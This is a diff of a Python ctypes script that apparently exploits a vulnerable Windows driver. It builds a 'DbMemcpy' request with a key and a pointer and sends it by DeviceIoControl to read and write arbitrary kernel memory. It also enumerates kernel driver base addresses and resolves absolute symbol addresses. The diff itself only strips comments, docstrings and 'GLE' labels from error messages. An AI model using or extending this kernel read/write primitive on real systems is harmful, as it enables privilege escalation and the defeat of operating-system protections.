@@ -20,22 +20,22 @@ gle = windll.kernel32.GetLastError
 
 def errcheck_bool(res, func, args):
     if not res:
-        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
+        raise Exception("{} failed. : {}".format(func.__name__, gle()))
     return res
 
 
 def errcheck_drivername(res, func, args):
     if res == 0:
-        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
+        raise Exception("{} failed. : {}".format(func.__name__, gle()))
     if res == args[2]:
         raise Exception(
-            "{} failed. Buffer too short. GLE: {}".format(func.__name__, gle())
+            "{} failed. Buffer too short. : {}".format(func.__name__, gle())
         )
     return res
 
 
 def errcheck_createfile(res, func, args):
-    if res == HANDLE(-1).value:  # INVALID_HANDLE_VALUE
+    if res == HANDLE(-1).value: 
         raise Exception("Failed to open device {}. GLE: {}".format(args[0], gle()))
     return res
 
@@ -77,7 +77,7 @@ EnumDeviceDrivers.restype = BOOL
 EnumDeviceDrivers.argtypes = [LPVOID, DWORD, POINTER(DWORD)]
 EnumDeviceDrivers.errcheck = errcheck_bool
 
-# constants
+
 GENERIC_READ = 1 << 30
 GENERIC_WRITE = 1 << 31
 FILE_SHARE_READ = 1
@@ -98,12 +98,12 @@ key = 0
 
 
 def GetProcAddressAbsolute(hmodule, realbase, symbol):
-    """get the absolute address of a symbol in memory"""
+    
     return GetProcAddress(hmodule, symbol) - hmodule + realbase
 
 
 class DbMemcpy(LittleEndianStructure):
-    """Memcpy arg structure that the driver expects for input"""
+    
 
     _fields_ = [("key", c_uint64), ("ptr", LPVOID), ("offset", DWORD), ("pad", DWORD)]
 
@@ -111,7 +111,7 @@ class DbMemcpy(LittleEndianStructure):
 def _read(hdev, ptr, size):
     mc = DbMemcpy(key, cast(ptr, LPVOID), 0, 0)
     buflen = sizeof(mc) + size
-    # need a mutable buffer
+    
     buf = (c_ubyte * buflen)()
     memmove(buf, bytes(mc), sizeof(mc))
     DeviceIoControl(
@@ -127,7 +127,7 @@ def _write(hdev, ptr, contents):
 
 
 def get_driver_bases():
-    """Return a dictionary of loaded kernel modules and their base addresses"""
+    
     lpcbNeeded = DWORD()
     EnumDeviceDrivers(None, 0, byref(lpcbNeeded))
     bases = (LPVOID * int(lpcbNeeded.value / sizeof(LPVOID)))()
